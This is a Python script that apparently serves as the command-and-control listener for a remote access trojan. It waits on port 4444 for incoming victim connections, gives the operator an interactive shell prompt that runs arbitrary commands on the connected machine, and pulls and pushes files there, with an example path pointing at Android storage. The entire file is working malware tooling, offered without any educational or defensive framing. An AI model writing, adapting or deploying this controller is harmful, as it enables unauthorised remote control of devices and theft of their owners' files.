import socket
import threading
import json
import os
import sys
import base64

# --- CONFIGURATION ---
SERVER_HOST = "0.0.0.0"  # listen on all interfaces
SERVER_PORT = 4444
# ---------------------

client = None
server = None  # so we can close it cleanly


def reliable_send(data):
    """Send any JSON-serializable object."""
    json_data = json.dumps(data)
    client.send(json_data.encode())


def reliable_recv():
    """Receive and decode JSON data."""
    data = b""
    while True:
        try:
            chunk = client.recv(4096)
            if not chunk:
                return None  # connection closed
            data += chunk
            return json.loads(data)
        except ValueError:
            # not a full JSON object yet
            continue
        except (ConnectionResetError, ConnectionAbortedError):
            return None


def download_file(file_path):
    """Ask the client for a file and save it locally."""
    reliable_send(f"download {file_path}")
    response = reliable_recv()

    if response is None:
        print("[-] Connection lost during download.")
        return

    # Expecting a dict from client for file transfers
    if not isinstance(response, dict):
        print("[-] Unexpected response type:", type(response), response)
        return

    mode = response.get("mode")

    if mode == "error":
        print(response.get("message", "[-] Unknown error during download."))
        return

    if mode == "file":
        b64_data = response.get("data")
        if not b64_data:
            print("[-] No data received for file.")
            return

        try:
            file_bytes = base64.b64decode(b64_data.encode())
            filename = os.path.basename(file_path)
            with open(filename, "wb") as f:
                f.write(file_bytes)
            print(f"[+] Downloaded {filename} successfully.")
        except Exception as e:
            print(f"[-] Failed to save file: {e}")
        return

    print("[-] Unknown response format:", response)


def upload_file(local_path):
    """Read a local file and send it to the client."""
    if not os.path.exists(local_path):
        print(f"[-] File not found: {local_path}")
        return

    try:
        with open(local_path, "rb") as f:
            content = f.read()

        remote_path = input(
            "Enter destination path on client (e.g., /sdcard/Downloads/myfile.txt): "
        )

        b64_data = base64.b64encode(content).decode()

        payload = {
            "mode": "upload",
            "path": remote_path,
            "data": b64_data,
        }

        reliable_send(payload)
        result = reliable_recv()
        if result is None:
            print("[-] Connection lost during upload.")
        else:
            print(result)
    except Exception as e:
        print(f"[-] Failed to read local file: {e}")


def handle_client(conn, addr):
    """Main function to handle the client connection."""
    global client, server
    client = conn
    print(f"[+] Accepted connection from {addr[0]}:{addr[1]}")

    while True:
        try:
            command = input(f"{addr[0]}@shell:~$ ").strip()

            if not command:
                continue

            if command == "exit":
                reliable_send("exit")
                print("[+] Closing connection.")
                client.close()
                server.close()
                sys.exit()

            elif command.startswith("download "):
                file_path = command[9:].strip()
                if file_path:
                    download_file(file_path)
                else:
                    print("[-] Usage: download <remote_file_path>")

            elif command.startswith("upload "):
                # Here 'command' is like: upload local_file_path
                local_path = command[7:].strip()
                if local_path:
                    upload_file(local_path)
                else:
                    print("[-] Usage: upload <local_file_path>")

            else:
                # normal command: send string, expect string back
                reliable_send(command)
                result = reliable_recv()
                if result is None:
                    print("[-] Connection lost.")
                    break
                print(result)

        except (ConnectionResetError, ConnectionAbortedError):
            print("[-] Client disconnected.")
            break
        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt. Closing connection.")
            try:
                reliable_send("exit")
            except Exception:
                pass
            client.close()
            server.close()
            sys.exit()


# --- Server Setup ---
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((SERVER_HOST, SERVER_PORT))
server.listen(5)
print(f"[*] Listening for connections on {SERVER_HOST}:{SERVER_PORT}...")

while True:
    conn, addr = server.accept()
    client_thread = threading.Thread(target=handle_client, args=(conn, addr))
    client_thread.daemon = True
    client_thread.start()